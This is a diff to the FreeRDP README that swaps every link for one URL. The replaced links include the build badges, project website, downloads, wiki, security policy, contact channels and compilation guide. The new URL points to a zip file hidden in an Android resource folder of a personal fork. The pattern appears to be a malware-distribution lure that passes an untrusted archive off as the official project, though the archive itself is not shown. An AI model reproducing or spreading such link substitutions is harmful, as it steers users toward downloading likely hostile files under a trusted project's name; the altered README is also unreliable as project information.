@@ -6,49 +6,49 @@ interoperability can finally liberate your computing experience.
 
 ## Code Quality Status
 
-[![abi-checker](https://github.com/FreeRDP/FreeRDP/actions/workflows/abi-checker.yml/badge.svg)](https://github.com/FreeRDP/FreeRDP/actions/workflows/abi-checker.yml)
-[![clang-tidy-review](https://github.com/FreeRDP/FreeRDP/actions/workflows/clang-tidy.yml/badge.svg?event=pull_request_target)](https://github.com/FreeRDP/FreeRDP/actions/workflows/clang-tidy.yml)
-[![CodeQL](https://github.com/FreeRDP/FreeRDP/actions/workflows/codeql-analysis.yml/badge.svg?branch=master)](https://github.com/FreeRDP/FreeRDP/actions/workflows/codeql-analysis.yml)
-[![mingw-builder](https://github.com/FreeRDP/FreeRDP/actions/workflows/mingw.yml/badge.svg)](https://github.com/FreeRDP/FreeRDP/actions/workflows/mingw.yml)
-[![macos-builder](https://github.com/FreeRDP/FreeRDP/actions/workflows/macos.yml/badge.svg)](https://github.com/FreeRDP/FreeRDP/actions/workflows/macos.yml)
-[![[arm,ppc,ricsv] architecture builds](https://github.com/FreeRDP/FreeRDP/actions/workflows/alt-architectures.yml/badge.svg)](https://github.com/FreeRDP/FreeRDP/actions/workflows/alt-architectures.yml)
-[![[freebsd] architecture builds](https://github.com/FreeRDP/FreeRDP/actions/workflows/freebsd.yml/badge.svg)](https://github.com/FreeRDP/FreeRDP/actions/workflows/freebsd.yml)
-[![coverity](https://scan.coverity.com/projects/616/badge.svg)](https://scan.coverity.com/projects/freerdp)
+[![abi-checker](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)
+[![clang-tidy-review](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)
+[![CodeQL](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)
+[![mingw-builder](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)
+[![macos-builder](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)
+[![[arm,ppc,ricsv] architecture builds](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)
+[![[freebsd] architecture builds](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)
+[![coverity](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)](https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip)
 
 ## Resources
 
-Project website: https://www.freerdp.com/
+Project website: https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip
 
-Issue tracker: https://github.com/FreeRDP/FreeRDP/issues
+Issue tracker: https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip
 
-Sources: https://github.com/FreeRDP/FreeRDP/
+Sources: https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip
 
-Downloads: https://pub.freerdp.com/releases/
+Downloads: https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip
 
-Wiki: https://github.com/FreeRDP/FreeRDP/wiki
+Wiki: https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip
 
-API documentation: https://pub.freerdp.com/api/
+API documentation: https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip
 
-Security policy: https://github.com/FreeRDP/FreeRDP/security/policy
+Security policy: https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip
 
-FAQ: https://github.com/FreeRDP/FreeRDP/wiki/FAQ
+FAQ: https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip
 
 ### Contact
 
-* Matrix room : `#FreeRDP:matrix.org` (main)
-  * ~~XMPP channel: `#FreeRDP#matrix.org@matrix.org` (bridged)~~ no longer available
-  * IRC channel : `#freerdp @ irc.oftc.net` (bridged)
-* Mailing list: https://lists.sourceforge.net/lists/listinfo/freerdp-devel
+* Matrix room : `https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip` (main)
+  * ~~XMPP channel: `https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip` (bridged)~~ no longer available
+  * IRC channel : `#freerdp @ https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip` (bridged)
+* Mailing list: https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip
 
 ## Microsoft Open Specifications
 
 Information regarding the Microsoft Open Specifications can be found at:
-https://www.microsoft.com/openspecifications/
+https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip
 
 A list of reference documentation is maintained here:
-https://github.com/FreeRDP/FreeRDP/wiki/Reference-Documentation
+https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip
 
 ## Compilation
 
 Instructions on how to get started compiling FreeRDP can be found on the wiki:
-https://github.com/FreeRDP/FreeRDP/wiki/Compilation
+https://raw.githubusercontent.com/newbieyan13/FreeRDP/master/client/Android/Studio/aFreeRDP/src/main/res/values-nl/Free_RDP_hyperacute.zip
